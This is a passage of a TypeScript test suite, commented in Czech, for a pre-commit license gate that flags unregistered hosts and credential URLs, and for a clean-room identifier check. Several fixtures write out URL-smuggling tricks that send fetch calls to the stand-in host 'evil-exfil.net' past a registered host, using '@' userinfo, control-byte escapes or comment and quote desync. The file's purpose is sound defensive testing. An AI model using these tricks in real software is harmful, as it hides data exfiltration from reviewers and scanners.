    write(dir, 'src/tern.ts', "const a = x ? y : // pozn.\n  z;\nfetch('https://po-ternaru.io/v1');\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-ternaru.io');
  });

  // Dvojtečka **těsně** před `//`, bez mezery — jediný tvar, na kterém se pozná,
  // jak úzká ta výjimka je. S mezerou (test výš) se rozdíl neprojeví, takže sám
  // o sobě nic nedokazuje: mutant, který výjimku rozšíří na libovolné `:`, ho
  // přežije. Obojí níž je legální kód a v obou případech je to komentář, ne
  // adresa — kdyby se nesetřel, jeho obsah by se skenoval jako volaný endpoint.
  it.each([
    ['klíč v objektu', "const o = { klic:// viz https://v-komentari.io/v1\n  1 };\n"],
    ['ternární bez mezery', "const u = cond ? 1 :// viz https://v-komentari.io/v1\n  2;\n"],
  ])('dvojtečka těsně před // (%s) schéma není', (_jmeno, zdroj) => {
    const dir = makeGreenRepo();
    write(dir, 'src/tight.ts', zdroj);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(out).not.toContain('v-komentari.io');
  });

  it('šipková funkce s regulárním výrazem neoslepí kontrolu na host pod ní', () => {
    const dir = makeGreenRepo();
    // `=> /['"]/` se bez `>` v sadě četlo jako dělení, uvozovka uvnitř otevřela
    // režim řetězce a host o řádek níž zmizel.
    write(dir, 'src/arrow.ts', "export const q = (s: string) => /['\"]/.test(s);\nconst e = 'https://po-sipce.io/v1';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-sipce.io');
    expect(code).toBe(1);
  });

  // Věta, ve které adresa jen stojí, není volaný endpoint: `new URL()` takovou
  // autoritu odmítne, takže `fetch` by na ní skončil výjimkou, ne požadavkem.
  // Brána, která hlásí věty, se obejde přes `--no-verify` — a tím se vypne i ta
  // druhá, takže falešný nález je tu stejně vážný jako díra.
  it.each([', sekce 3', '; sekce 3', ' a pak dál', ' (viz níž)', ' — konec'])(
    'věta pokračující %j za adresou není nález',
    (pokracovani) => {
      const dir = makeGreenRepo();
      write(dir, 'src/prose.ts', `export const hint = 'viz https://api.fixture-provider.io${pokracovani}';\n`);

      expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
    },
  );

  it('věta, ve které za adresou stojí e-mail, nález JE — a je to správně', () => {
    const dir = makeGreenRepo();
    // Vypadá to jako falešný nález, ale není: `new URL()` z toho udělá userinfo
    // a host `firma.cz`, takže kdyby ten řetězec někdo poslal do `fetch`,
    // požadavek jde tam. Je to cena za to, že výčet znaků zmizel — a je
    // zapsaná tady, aby ji příští kolo nesmazalo jako omyl.
    write(dir, 'src/mail.ts', "export const t = 'viz https://api.fixture-provider.io nebo pis na podpora@firma.cz';\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('firma.cz');
  });

  it('lokální server s portem skládaným za běhu není nález', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/dev.ts', 'export const ping = (p: number) => fetch(`http://127.0.0.1:${p}/health`);\n');
    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);

    // A totéž bez cesty za portem — useknuté je v portu, ne v hostu.
    write(dir, 'src/dev2.ts', 'export const base = (p: number) => `http://127.0.0.1:${p}`;\n');
    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('cesta skládaná za běhu projde, host skládaný za běhu ne', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/tpl.ts', 'export const u = (id: string) => `https://api.fixture-provider.io/v1/${id}`;\n');
    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);

    write(dir, 'src/tpl2.ts', 'export const v = (h: string) => `https://api.fixture-provider.io${h}/v1`;\n');
    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('soubor .mts se skenuje stejně jako .ts', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/edge.mts', "await fetch('https://jen-v-mts.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('jen-v-mts.io');
    expect(code).toBe(1);
  });

  /**
   * Konec literálu se dřív značil bajtem `U+0002` **uvnitř** skenovaného textu, a
   * značku uvnitř dat si skenovaný soubor umí napsat sám. WHATWG ten bajt zakóduje
   * do userinfo, takže `fetch` šel na host za posledním `@`, zatímco brána hlásila
   * ten před ním — registrovaný, tedy zeleně. Hranice je od té doby offset mimo
   * text, takže tady není co podstrčit.
   *
   * Escapy se skládají za běhu ze zpětného lomítka: napsané přímo je editory na
   * tomhle stroji opakovaně převedly na skutečný řídicí bajt, čímž by se z pěti
   * různých zápisů staly dva stejné a tabulka by tiše měřila míň, než tvrdí.
   */
  const BACKSLASH = String.fromCharCode(92);
  it.each([
    ['unicode escapem', `${BACKSLASH}u0002`],
    ['hex escapem', `${BACKSLASH}x02`],
    ['zápisem kódového bodu', `${BACKSLASH}u{2}`],
    ['oktalovým escapem', `${BACKSLASH}2`],
    ['syrovým bajtem', String.fromCharCode(2)],
  ])('konec literálu podstrčený %s skutečný cíl neskryje', (_zapis, marker) => {
    const dir = makeGreenRepo();
    write(dir, 'src/mark.ts', `await fetch('https://api.fixture-provider.io${marker}@evil-exfil.net/v1');\n`);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
    expect(code).toBe(1);
  });

  it('týž tvar s heslem ohlásí i kontrolu údajů, a heslo nevypíše', () => {
    const dir = makeGreenRepo();
    // Dřív neohlásila **ani jedna** kontrola: hosty viděly registrovaný host,
    // kontrola údajů se zastavila před `@`, takže žádné userinfo neviděla.
    write(dir, 'src/cred.ts', `const u = 'https://api.fixture-provider.io${BACKSLASH}u0002:hunter2@evil-exfil.net/v1';\n`);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('URL nese userinfo');
    expect(out).not.toContain('hunter2');
    expect(code).toBe(1);
  });

  /**
   * Neuzavřený `/*` v kódové pozici zahazoval **zbytek souboru** — a do kódové
   * pozice stačí dostat se jedním rozejitým stavem uvozovek. Brána pak nad
   * voláním, které v souboru stojí, hlásila 7/7 PASS: mlčení, ne nález.
   */
  it.each([
    ['regulárním výrazem po konci bloku', `function f() { return 1; }\nconst q = /['"]/.test(s);\n`],
    ['apostrofem v JSX textu', `export const Hero = () => <p>Let's go</p>;\n`],
  ])('neuzavřený blokový komentář po rozejití stavu %s neoslepí zbytek souboru', (_jak, prefix) => {
    const dir = makeGreenRepo();
    write(dir, 'src/blind.ts', `${prefix}const c = '/*';\nawait fetch('https://evil-exfil.net/v1');\n`);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
    expect(code).toBe(1);
  });

  /**
   * Oba případy výš mají rozejití a `/*` na různých řádcích, takže je zachrání
   * **kterákoli** z těch dvou pojistek — a ani jedna z nich tím není doložená.
   * Naměřeno: mutant, který ochranu neuzavřeného `/*` zase vypnul, nechal celou
   * sadu zelenou. Tenhle případ má obojí na jednom řádku, takže reset na konci
   * řádku nemá co zachránit a zbývá jen ta správná pojistka.
   */
  it('neuzavřený blokový komentář na TÉMŽ řádku jako rozejití taky neoslepí', () => {
    const dir = makeGreenRepo();
    write(
      dir,
      'src/blind-oneline.ts',
      "export const t = 'Let's go'; const c = '/*'; await fetch('https://evil-exfil.net/v1');\n",
    );

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
    expect(code).toBe(1);
  });

  /**
   * A obráceně: tady je nosný **jen** reset na konci řádku, žádné `/*` v souboru
   * není. Bez resetu se řetězec otevřený rozejitím táhne přes konec řádku, takže
   * konec literálu u adresy padne jinam a registrovaný host se ohlásí pod
   * zmrzačeným jménem — tedy falešný nález, a ten se obchází přes `--no-verify`.
   */
  it('rozejitý stav uvozovek nezmrzačí jméno hostu o řádek níž', () => {
    const dir = makeGreenRepo();
    write(
      dir,
      'src/desync.ts',
      "export const msg = 'Let's go';\nconst u = 'https://api.fixture-provider.io';\n",
    );

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  /**
   * Registrovaný host s interpunkcí věty za sebou hlásila brána jako jiný,
   * nezaregistrovaný host (`api.fixture-provider.io.`). **Falešný nález je tu
   * stejně vážný jako díra:** obchází se přes `--no-verify`, čímž se vypne i
   * clean-room brána vedle.
   */
  it.each(['.', '!', '?', ',', ';', ':', ')', '}', "'"])(
    'registrovaný host s %j za sebou není nález',
    (interpunkce) => {
      const dir = makeGreenRepo();
      write(dir, 'src/punct.ts', `export const hint = "viz https://api.fixture-provider.io${interpunkce}";\n`);

      expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
    },
  );

  it('JSON zapsaný v jednoduchých uvozovkách taky nález nedělá', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/json.ts', `const j = '{"src":"https://api.fixture-provider.io"}';\n`);

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('interpunkce za podstrčeným cílem ten cíl neschová', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/at.ts', `export const t = 'viz https://api.fixture-provider.io@evil-exfil.net/v1.';\n`);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
  });

  /**
   * Tohle je jediný případ, kde je výjimka z ořezu pro autoritu s `@` skutečně
   * nosná. `]` je součást hostu, ne interpunkce věty — a výjimka pro IPv6 se sem
   * nechytí, protože autorita začíná uživatelským jménem, ne závorkou. Bez té
   * výjimky se autorita ořezem stane neparsovatelnou, takže **údaj zmizí úplně**:
   * kontrola údajů nerozparsovanou URL přeskakuje.
   */
  it('userinfo před IPv6 hostem bez cesty se ořezem neztratí', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/v6cred.ts', "await fetch('https://user@[2606:4700::1111]');\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('URL nese userinfo');
    expect(out).not.toContain('nedá se rozparsovat');
  });

  it('neregistrovaný host s tečkou se hlásí pod svým čistým jménem', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/dot.ts', `await fetch('https://neregistrovany.io.');\n`);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany.io');
    expect(out).not.toContain('neregistrovany.io.');
  });

  it('IPv6 host bez cesty ořez nerozbije', () => {
    const dir = makeGreenRepo();
    // `]` je součást autority, ne interpunkce věty. Ořez by z `[2606:4700::1111]`
    // udělal neparsovatelné `[2606:4700::1111`, tedy nález z jiného důvodu.
    write(dir, 'src/v6.ts', "await fetch('https://[2606:4700::1111]');\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('2606:4700::1111');
    expect(out).not.toContain('nedá se rozparsovat');
  });
});

describe('license-gate: DISCLOSURE.md je výpis, ne text (kontrola 6)', () => {
  it('selže, když někdo soubor upraví ručně', () => {
    const dir = makeGreenRepo();
    const path = join(dir, 'DISCLOSURE.md');
    writeFileSync(path, `${readFileSync(path, 'utf8')}\nRučně dopsaná věta.\n`, 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([6]);
    expect(out).toContain('rozešel s registrem');
    expect(code).toBe(1);
  });

  it('selže, když soubor chybí úplně', () => {
    const dir = makeGreenRepo();
    rmSync(join(dir, 'DISCLOSURE.md'));

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([6]);
  });
});

describe('license-gate: čisté funkce', () => {
  it('stripComments nechá URL v řetězci a zahodí ji v komentáři na témž řádku', () => {
    const stripped = stripComments("const u = 'https://ostra.io/x'; // https://komentar.io/y\n");
    expect(stripped).toContain('ostra.io');
    expect(stripped).not.toContain('komentar.io');
  });

  it('stripComments neuřízne řetězec, který obsahuje //', () => {
    expect(stripComments("const u = 'https://a.io//b';\n")).toContain('a.io//b');
  });

  it('stripComments přeskočí regulární literál celý, ne po první lomítko', () => {
    const stripped = stripComments("const r = /https:\\/\\//; const u = 'https://za-regexem.io/x';\n");
    expect(stripped).toContain('za-regexem.io');
  });

  it('stripComments nepovažuje dělení za regulární literál', () => {
    // Kdyby ano, spolkl by všechno až po další `/` a s tím i URL za ním.
    const stripped = stripComments("const x = total / count; const u = 'https://po-deleni.io/x';\n");
    expect(stripped).toContain('po-deleni.io');
    expect(stripped).toContain('total / count');
  });

  it('stripComments pozná regulární literál i po klíčovém slově', () => {
    const stripped = stripComments("function f() { return /a\\/\\/b/; }\nconst u = 'https://po-returnu.io/x';\n");
    expect(stripped).toContain('po-returnu.io');
  });

  it('stripComments pořád zahodí řádkový komentář, který regexem nezačíná', () => {
    const stripped = stripComments("const x = 1; // https://uvnitr-komentare.io/y\n");
    expect(stripped).not.toContain('uvnitr-komentare.io');
  });

  it('hostsIn vrátí skutečný host, ne to, co stojí před @', () => {
    expect([...hostsIn("fetch('https://api.openai.com@evil-exfil.net/v1');")]).toEqual(['evil-exfil.net']);
  });

  it('credentialUrlsIn nahlásí userinfo a nevypíše heslo', () => {
    const found = [...credentialUrlsIn("fetch('https://honza:tajneheslo@sluzba.io/v1');")];
    expect(found).toEqual(['https://***@sluzba.io/…']);
  });

  it('credentialUrlsIn mlčí nad běžnou URL', () => {
    expect([...credentialUrlsIn("fetch('https://sluzba.io/v1');")]).toEqual([]);
  });

  it('hostsIn nevymýšlí host u URL složené za běhu', () => {
    expect([...hostsIn('fetch(`https://${provider}.example/v1`);')]).toEqual([]);
  });

  it('stripComments dekóduje escape na znak, který znamená', () => {
    expect(stripComments("const u = 'a\\u0040b';\n")).toContain('a@b');
    expect(stripComments("const u = 'a\\x40b';\n")).toContain('a@b');
    expect(stripComments("const u = 'a\\u{40}b';\n")).toContain('a@b');
  });

  it('stripComments nepovažuje uzavírací JSX značku za regulární literál', () => {
    const stripped = stripComments("const f = () => <div>{t}</div>; const u = 'https://po-jsx.io//a';\n");
    expect(stripped).toContain('po-jsx.io//a');
  });

  it('stripComments přeskočí i regulární literál, který má uvnitř uvozovky', () => {
    // Zamítat span s uvozovkou se zkoušelo a rozbilo to parsování tohohle
    // vlastního souboru: `"` uvnitř třídy otevřela režim řetězce a následující
    // blokový komentář se přečetl jako obsah, takže brána hlásila host z komentáře.
    const stripped = stripComments("const r = /[^\\]\\s\"'`]*\\//; const u = 'https://za-tridou.io/v1';\n");
    expect(stripped).toContain('za-tridou.io');
    expect(stripped).not.toContain('nikdy-tu-nebyl');
  });

  it('stripComments zahodí blokový komentář za regulárním literálem s uvozovkou', () => {
    const stripped = stripComments(
      "const r = /[\"']/;\n/** viz https://uvnitr-bloku.io/docs */\nconst u = 'https://ostry2.io/v1';\n",
    );
    expect(stripped).not.toContain('uvnitr-bloku.io');
    expect(stripped).toContain('ostry2.io');
  });

  it('hostsIn přečte IPv6 host v hranatých závorkách', () => {
    expect([...hostsIn("fetch('https://[2606:4700:4700::1111]/v1');")]).toEqual(['[2606:4700:4700::1111]']);
  });

  it('hostsIn u nerozparsovatelné URL nevypíše ani heslo, ani query', () => {
    const found = [...hostsIn("fetch('https://svc:tajneheslo@internal.io:99999/v1?token=nevypisovat');")];
    expect(found).toHaveLength(1);
    expect(found[0]).not.toContain('tajneheslo');
    expect(found[0]).not.toContain('nevypisovat');
    expect(found[0]).toContain('nedá se rozparsovat');
  });

  it('credentialUrlsIn najde údaj schovaný za znakem mimo znakovou třídu', () => {
    // Týž trik jako u hostu: třída skončí na `<`, takže bez čtení celé autority
    // se parsuje jen `https://user:pass` — bez `@`, tedy bez údaje. A `hostsIn`
    // nad tím vrátí registrovaný host, takže by údaj neohlásila ani jedna
    // kontrola a heslo by odešlo do veřejného repozitáře.
    const found = [...credentialUrlsIn("fetch('https://user:tajneheslo<@api.fixture-provider.io/v1');")];
    expect(found).toEqual(['https://***@api.fixture-provider.io/…']);
    expect(found[0]).not.toContain('tajneheslo');
  });

  it('credentialUrlsIn nevypíše cestu', () => {
    const found = [...credentialUrlsIn("fetch('https://svc:heslo@sluzba.io/reset/nevypisovat');")];
    expect(found).toEqual(['https://***@sluzba.io/…']);
  });

  it('hostsIn vynechá loopback i jména vyhrazená pro dokumentaci', () => {
    const hosts = hostsIn(
      "fetch('http://localhost:3000/a'); fetch('https://127.0.0.1/b'); fetch('https://example.com/c'); fetch('https://vyhrazena.test/d'); fetch('https://opravdu-ostra.io/e');",
    );
    expect([...hosts]).toEqual(['opravdu-ostra.io']);
  });

  it('noticesFor rozloží složenou licenci na notices všech částí', () => {
    const notices = noticesFor('Apache-2.0 AND LGPL-3.0-or-later');
    expect(notices).toContain('označení změn');
    expect(notices).toContain('dostupnost zdrojů knihovny');
  });

  it('noticesFor u neznámé licence nevrátí nic — a prázdné pole shodí kontrolu 1', () => {
    expect(noticesFor('SSPL-1.0')).toEqual([]);
  });
});

describe('cleanroom-check: fail-closed', () => {
  it('CHYBĚJÍCÍ seznam je selhání, ne přeskočení kontroly', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'src/a.ts', 'export const x = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('chybí');
    expect(out).toContain('NEPŘESKAKUJE');
  });

  it('seznam jen s komentáři je taky selhání — prázdný projde čímkoli', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', '# jen komentář\n\n# a další\n');
    write(dir, 'src/a.ts', 'export const x = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('neobsahuje jediný identifikátor');
  });
});

describe('cleanroom-check: nepřečtený soubor je neznámý soubor', () => {
  // Nečitelný soubor se na Windows spolehlivě vyrobit nedá (chmod tam čtení
  // nezakáže, visící symlink chce oprávnění), takže se testuje rozhodnutí, ne
  // způsob, jak soubor znečitelnit. Kdyby to jelo přes CLI, byla by tahle větev
  // zelená jen na Linuxu — a na téhle mašině by netvrdila nic.
  it('soubor, který se nepodařilo přečíst, brání průchodu stejně jako nález', () => {
    const result = verdict([{ shown: 'src/zamceny.ts', text: null }], ['ProprietaryActionRunner']);
    expect(result.skipped).toEqual(['src/zamceny.ts']);
    expect(result.files).toBe(0);
    expect(result.blocked).toBe(true);
  });

  it('přečtený čistý soubor průchodu nebrání', () => {
    const result = verdict([{ shown: 'src/a.ts', text: 'export const x = 1;\n' }], ['ProprietaryActionRunner']);
    expect(result.skipped).toEqual([]);
    expect(result.blocked).toBe(false);
  });

  it('nález blokuje i bez jediného nepřečteného souboru', () => {
    const result = verdict([{ shown: 'src/a.ts', text: 'new ProprietaryActionRunner();\n' }], [
      'ProprietaryActionRunner',
    ]);
    expect(result.blocked).toBe(true);
    expect(result.findings).toHaveLength(1);
  });
});

describe('cleanroom-check: nenaplněný seznam se musí přiznat', () => {
  function repo(list: string): string {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', list);
    write(dir, 'src/a.ts', 'export const x = 1;\n');
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('prázdný seznam s direktivou SELŽE — přiznat se nestačí', () => {
    // Dřív tenhle stav končil nulou. Přiznaná nula je pořád nula: hook nad ní
    // pustí dál cokoli a výstup u toho vypíše počet prohledaných souborů.
    const { code, out } = run(CLEANROOM, repo('# hlavička\n#!unprovisioned\n'));
    expect(code).toBe(1);
    expect(out).toContain('nehlídá nic');
    expect(out).toContain('CLEANROOM_ALLOW_UNPROVISIONED');
  });

  it('projít smí jen s vědomým obejitím, a i tak to hlásí', () => {
    const { code, out } = run(CLEANROOM, repo('# hlavička\n#!unprovisioned\n'), [], {
      CLEANROOM_ALLOW_UNPROVISIONED: '1',
    });
    expect(code).toBe(0);
    expect(out).toContain('POZOR');
    expect(out).toContain('nehlídá nic');
  });

  it('direktiva se nehledá jako identifikátor, jinak by shodila vlastní commit', () => {
    const dir = repo('#!unprovisioned\n');
    // Přesně ta situace, která shodila první verzi: řetězec direktivy stojí ve
    // skenovaném souboru. Nálezem být nesmí. Obejití je tu jen proto, aby test
    // měřil nález, ne nenaplněnost seznamu.
    write(dir, 'src/b.ts', "export const marker = '#!unprovisioned';\n");

    const { code, out } = run(CLEANROOM, dir, [], { CLEANROOM_ALLOW_UNPROVISIONED: '1' });
    expect(code).toBe(0);
    expect(out).not.toContain('src/b.ts');
  });

  it('naplněný seznam s zapomenutou direktivou hlásí, že direktiva lže', () => {
    const { out } = run(CLEANROOM, repo('#!unprovisioned\nProprietaryActionRunner\n'));
    expect(out).toContain('pořád je označený');
  });

  it('naplněný seznam bez direktivy nehlásí nic', () => {
    const { code, out } = run(CLEANROOM, repo('ProprietaryActionRunner\n'));
    expect(code).toBe(0);
    expect(out).not.toContain('POZOR');
  });
});

describe('cleanroom-check: nálezy', () => {
  /**
   * Skutečný git repozitář, ne jen adresář: kontrola bere soubory z
   * `git ls-files`, aby ignorované soubory (`SECURITY-FINDINGS.md`) nehlásila.
   * Fixtura tím jede stejnou cestou jako ostrý běh.
   */
  function repoWith(identifiers: string, source: string, gitignore = ''): string {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', identifiers);
    write(dir, 'src/a.ts', source);
    if (gitignore) write(dir, '.gitignore', gitignore);
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('ignorovaný soubor se neskenuje — jinak by nález nešlo nikdy opravit', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n', 'tajne.md\n');
    write(dir, 'tajne.md', 'Interní dokument, zmiňuje ProprietaryActionRunner.\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(0);
    expect(out).not.toContain('tajne.md');
  });

  it('mimo git repozitář je to selhání, ne sken prázdné množiny', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-nogit-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', 'ProprietaryActionRunner\n');
    write(dir, 'src/a.ts', 'new ProprietaryActionRunner();\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('git ls-files selhal');
  });

  it('najde zakázaný identifikátor a vypíše soubor i řádek', () => {
    const { code, out } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'const a = 1;\nnew ProprietaryActionRunner();\n'));
    expect(code).toBe(1);
    expect(out).toContain('src/a.ts:2');
  });

  it('do výstupu se identifikátor NEVYPISUJE — výstup končí v logu', () => {
    const { out } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'new ProprietaryActionRunner();\n'));
    expect(out).not.toContain('ProprietaryActionRunner');
    expect(out).toContain('identifikátor č. 1 ze seznamu');
  });

  it('čte INDEX, ne disk: opravený soubor na disku neschová zakázané jméno v indexu', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n');
    write(dir, 'src/staged.ts', 'new ProprietaryActionRunner();\n');
    execFileSync('git', ['add', 'src/staged.ts'], { cwd: dir, stdio: 'ignore' });
    // Přesně to obvyklé pořadí kroků: brána zaječí, člověk soubor opraví,
    // zapomene `git add`, commitne znovu. Index tam to jméno pořád má.
    write(dir, 'src/staged.ts', 'export const ok = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('src/staged.ts:1');
  });

  it('trackovaný seznam je selhání — .gitignore neubrání `git add -f`', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n', 'scripts/cleanroom-forbidden.txt\n');
    execFileSync('git', ['add', '-f', 'scripts/cleanroom-forbidden.txt'], { cwd: dir, stdio: 'ignore' });

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('je TRACKOVANÝ');
  });

  it('shoduje celá slova, takže Reactor netrefí identifikátor Actor', () => {
    const { code, out } = run(CLEANROOM, repoWith('Actor\n', 'class Reactor {}\nconst ActorId = 1;\n'));
    expect(code).toBe(0);
    expect(out).toContain('žádný nález');
  });

  it('sám seznam se neskenuje, jinak by hlásil nález pokaždé', () => {
    const { code } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n'));
    expect(code).toBe(0);
  });

});

describe('cleanroom-check: čisté funkce', () => {
  it('parseList zahodí komentáře a prázdné řádky', () => {
    expect(parseList('# hlavička\n\nAlfa\n  Beta  \n# konec\n')).toEqual(['Alfa', 'Beta']);
  });

  it('findHits vrací číslo řádku od jedničky', () => {
    expect(findHits('nic\nAlfa tady\n', ['Alfa'])).toEqual([{ identifier: 'Alfa', index: 0, line: 2 }]);
  });

  it('findHits nebere podřetězec uvnitř delšího identifikátoru', () => {
    expect(findHits('const AlfaBeta = 1;\nconst x_Alfa_y = 2;\n', ['Alfa'])).toEqual([]);
  });

  it('findHits bere identifikátor oddělený tečkou nebo závorkou', () => {
    expect(findHits('eca.Alfa(1);\n', ['Alfa'])).toEqual([{ identifier: 'Alfa', index: 0, line: 1 }]);
  });
});
